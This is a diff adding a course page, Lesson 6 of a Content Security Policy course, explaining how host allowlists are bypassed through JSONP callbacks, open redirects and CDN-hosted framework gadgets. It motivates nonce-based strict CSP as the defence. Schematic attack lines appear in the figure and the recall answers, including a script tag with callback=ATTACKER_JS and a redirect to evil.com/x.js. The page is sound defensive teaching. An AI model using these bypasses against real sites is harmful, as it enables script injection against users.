@@ -1,0 +1,100 @@
+<link rel="stylesheet" href="../../../assets/course.css">
+<title>Lesson 6 — Why host allowlists fail</title>
+
+<p class="eyebrow">Content Security Policy · Lesson 6</p>
+<h1>Why host allowlists fail</h1>
+<p class="lede">L5 kept pointing here: host allowlists are bypassable "in most configurations." This lesson makes that concrete. The flaw isn't a typo in your policy — it's the <em>model</em>. "Trust this domain" quietly means "trust every byte that domain can be made to emit," and on real CDNs that includes attacker-chosen script. Google measured it across the web; the numbers are brutal.</p>
+
+<h2>The concept</h2>
+
+<p>A host-allowlist policy like <code>script-src 'self' https://trusted-cdn.com https://apis.example.com</code> encodes one assumption: <strong>a script served by an allowlisted origin is safe.</strong> That assumption is false whenever an allowlisted origin can be <em>coerced</em> into serving script the attacker controls — and popular domains can, routinely.<sup><a href="#s1">1</a></sup></p>
+
+<div class="callout gotcha">
+  <span class="tag">The measurement (Weichselbaum et al., CCS 2016)</span>
+  Across <strong>1,680,867 hosts</strong> and <strong>26,011 unique policies</strong>: <strong>94.72%</strong> of distinct policies contained a bypass; <strong>75.81%</strong> used script allowlists an attacker could exploit; and <strong>99.34%</strong> of hosts with CSP ran policies offering <em>no</em> benefit against XSS. Crucially: <strong>14 of the 15</strong> most-commonly-allowlisted script domains hosted unsafe endpoints. The allowlist model wasn't marginally weak — it was almost universally broken.<sup><a href="#s1">1</a></sup>
+</div>
+
+<h2>The steps</h2>
+
+<p>Three ways an allowlisted origin turns into arbitrary script execution — plus the reason the list rots over time.</p>
+
+<div class="figure">
+<pre><code>Policy:  script-src 'self' https://trusted-cdn.com
+
+1. JSONP        &lt;script src="https://trusted-cdn.com/api?callback=ATTACKER_JS"&gt;
+                 → endpoint echoes ATTACKER_JS as executable script  ✓ allowlisted, ✓ runs
+2. open redirect &lt;script src="https://trusted-cdn.com/redirect?to=https://evil.com/x.js"&gt;
+                 → 302 to evil.com; path check is DROPPED on redirect (L2)  ✓ runs
+3. hosted gadget script-src includes a CDN that hosts AngularJS / a vulnerable lib
+                 → injected markup uses the trusted lib as an execution gadget  ✓ runs
+4. rot          the allowlist grows, vendors add endpoints, entries outlive their reason</code></pre>
+<p class="cap">Every one of these loads script from an origin your policy explicitly trusts. CSP does exactly what you told it — the instruction was just wrong.</p>
+</div>
+
+<h3>Step 1 — JSONP endpoints: the trusted domain hands over the pen</h3>
+<p>A JSONP endpoint takes a <code>callback</code> parameter and reflects it into an executable script response: request <code>…/api?callback=foo</code> and you get back <code>foo({…data…})</code>. Set <code>callback</code> to attacker JavaScript instead of a function name and the trusted domain <em>serves your code as script</em>. Point a <code>&lt;script src&gt;</code> at that endpoint on an allowlisted host and CSP waves it through — the origin matches. This is why Google's study found unsafe endpoints on 14 of the 15 most-allowlisted domains: big API hosts ship JSONP.<sup><a href="#s1">1</a></sup></p>
+
+<h3>Step 2 — Open redirects: and the path restriction that evaporates</h3>
+<p>Suppose you were careful and path-restricted the entry: <code>script-src https://trusted-cdn.com/safe/</code>. An <strong>open redirect</strong> on that host — <code>…/redirect?to=…</code> — defeats it, because (from L2) <strong>the path component is not enforced after a redirect</strong>. The browser matches the initial request's scheme/host/port, follows the 302 to an attacker URL, and the path you pinned is never checked against the destination. Redirects turn a narrow, careful allowlist entry back into a broad one.<sup><a href="#s2">2</a></sup></p>
+
+<h3>Step 3 — Shared CDNs &amp; framework gadgets</h3>
+<p>Two problems compound here. First, shared CDNs: PortSwigger's guidance is blunt — <em>"content delivery networks (CDNs) that do not use per-customer URLs, such as <code>ajax.googleapis.com</code>, should not be trusted, because third parties can get content onto their domains."</em><sup><a href="#s3">3</a></sup> Second, gadgets: if an allowlisted CDN hosts a framework like AngularJS, injected markup can use that <em>already-trusted</em> library's templating to execute — no new script origin needed, just HTML that the trusted framework interprets.<sup><a href="#s1">1</a></sup></p>
+
+<h3>Step 4 — The list rots</h3>
+<p>Even a clean allowlist decays. Teams add a vendor for one feature and leave it forever; a trusted host adds a JSONP endpoint next quarter; an acquired subdomain changes hands. An allowlist is a standing claim about the current behaviour of every listed origin — a claim nobody re-verifies. Security that depends on continuous manual curation is security that quietly lapses.</p>
+
+<h2>Why this matters</h2>
+
+<p><strong>1. The bug is in the model, not the policy.</strong> You cannot audit your way to a safe allowlist while trusted domains host JSONP, redirects, and frameworks. The correct response isn't "tighten the list" — it's "stop basing trust on the origin." That reframing is the entire motivation for strict CSP (L7).</p>
+
+<p><strong>2. Path restrictions give false comfort.</strong> The redirect rule you learned as a matching detail in L2 is an <em>offensive tool</em> here: it neutralizes the one control people reach for to narrow a broad host entry. Knowing L2's edge and L6's exploit are the same fact is the deep-understanding tell.</p>
+
+<p><strong>3. This is why nonces won.</strong> A nonce trusts <em>a specific script element you emitted this response</em>, not a domain that might be coerced. It can't be reached by a JSONP call, a redirect, or a hosted gadget, because none of those carry your fresh nonce. L7 builds the policy that leans on exactly that.</p>
+
+<div class="callout interview">
+  <span class="tag">Key line</span>
+  "Host allowlists fail because trusting a domain means trusting anything it can be made to serve — and popular domains serve attacker-controllable script via JSONP endpoints (<code>?callback=</code> reflects your JS), open redirects (which also erase any path restriction, since CSP drops the path after a redirect), and hosted frameworks used as gadgets. Google measured ~95% of real policies bypassable. The fix isn't a tighter list; it's abandoning origin-based trust for nonces and <code>'strict-dynamic'</code>."
+</div>
+
+<div class="callout gotcha">
+  <span class="tag">The trap</span>
+  Shallow: "allowlists are fine if you only list domains you trust." That's the exact fallacy the CCS 2016 data demolishes — the <em>most-trusted</em> domains (Google APIs, major CDNs) were the ones with JSONP and redirects. Naming a concrete vector (JSONP <code>?callback=</code>, or the redirect-drops-path trick) and citing "trusted ≠ un-coercible" separates a real answer from a hand-wave.
+</div>
+
+<div class="recall">
+  <p class="q">Recall — answer out loud before peeking:</p>
+  <p>① Policy is <code>script-src https://trusted-cdn.com</code>. The CDN has a JSONP endpoint. How does an attacker run arbitrary JS?</p>
+  <details><summary>show answer</summary>
+  <p class="a">Inject <code>&lt;script src="https://trusted-cdn.com/api?callback=ATTACKER_JS"&gt;</code>. The endpoint reflects the <code>callback</code> value into an executable script response, served from the allowlisted origin — so CSP allows it and the attacker's JS runs.</p></details>
+  <p>② You pinned <code>script-src https://cdn.com/safe/</code>. Why doesn't the path restriction save you if the host has an open redirect?</p>
+  <details><summary>show answer</summary>
+  <p class="a">CSP <strong>drops the path component after a redirect</strong> (L2). The 302 to an attacker URL is followed, and only the original scheme/host/port were matched — the pinned path is never checked against the destination.</p></details>
+  <p>③ Why is a nonce-based policy not vulnerable to the JSONP/redirect/gadget bypasses?</p>
+  <details><summary>show answer</summary>
+  <p class="a">A nonce trusts a specific element carrying <em>your</em> fresh per-response value — not an origin. A JSONP call, redirect, or hosted gadget can't produce a script element bearing that nonce, so none of them are authorized.</p></details>
+  <p>④ Roughly what fraction of real CSP policies did Google find bypassable, and what made the "most-trusted" domains the problem?</p>
+  <details><summary>show answer</summary>
+  <p class="a">~<strong>94.7%</strong> of distinct policies had a bypass; ~99% of hosts got no XSS benefit. The most-allowlisted domains were the problem precisely because they host JSONP/redirect/framework endpoints — 14 of the top 15 had unsafe endpoints.</p></details>
+</div>
+
+<div class="callout">
+  <span class="tag">Primary source — read this one</span>
+  <a href="https://research.google/pubs/pub45542/">"CSP Is Dead, Long Live CSP!" — Weichselbaum, Spagnuolo, Akrout, Lekies (ACM CCS 2016)</a>. The measurement study behind this entire lesson and the strict-CSP push. Read the abstract and §3 (the bypass taxonomy). Then run a real policy through <a href="https://csp-evaluator.withgoogle.com/">Google's CSP Evaluator</a> and watch it flag the exact endpoints this lesson describes.
+</div>
+
+<div class="ask-teacher">
+  <strong>Reproduce one to own it.</strong> Walking a specific bypass end-to-end — a JSONP chain, or the redirect-path trick — is the fastest way to be able to narrate it cold in an interview. <strong>Lesson 7 is the payoff: the strict CSP that makes all four of these vectors irrelevant — nonces + <code>'strict-dynamic'</code>, with <code>object-src 'none'</code> and <code>base-uri 'none'</code> closing the flanks.</strong>
+</div>
+
+<div class="course-nav">
+  <span><a href="0005-csp1-vs-csp2-vs-csp3.html">← Lesson 5</a></span>
+  <span><a href="../reference/glossary.html">Glossary ↗</a></span>
+  <span><a href="0007-strict-csp-nonces-and-strict-dynamic.html"><em>Next: Lesson 7 — strict CSP: nonces + 'strict-dynamic' →</em></a></span>
+</div>
+
+<hr style="border:none;border-top:1px solid var(--rule);margin:2.5rem 0 1rem">
+<p class="src"><strong>Sources</strong><br>
+<span id="s1">1.</span> Measured bypass rates (94.72% / 75.81% / 99.34%), "14 of 15 most-whitelisted domains have unsafe endpoints," the JSONP/open-redirect/hosted-framework taxonomy, and <code>'strict-dynamic'</code> as the proposed fix — <a href="https://research.google/pubs/pub45542/">Weichselbaum et al., "CSP Is Dead, Long Live CSP!", ACM CCS 2016</a>.<br>
+<span id="s2">2.</span> Path component dropped on redirect (match uses request URL, not the redirect target) — <a href="https://www.w3.org/TR/CSP3/#match-url-to-source-list">W3C CSP3 §6.7 matching</a> (see also Lesson 2).<br>
+<span id="s3">3.</span> Shared-CDN warning ("<code>ajax.googleapis.com</code>… should not be trusted, because third parties can get content onto their domains") — <a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy">PortSwigger — Content Security Policy</a>.
+</p>
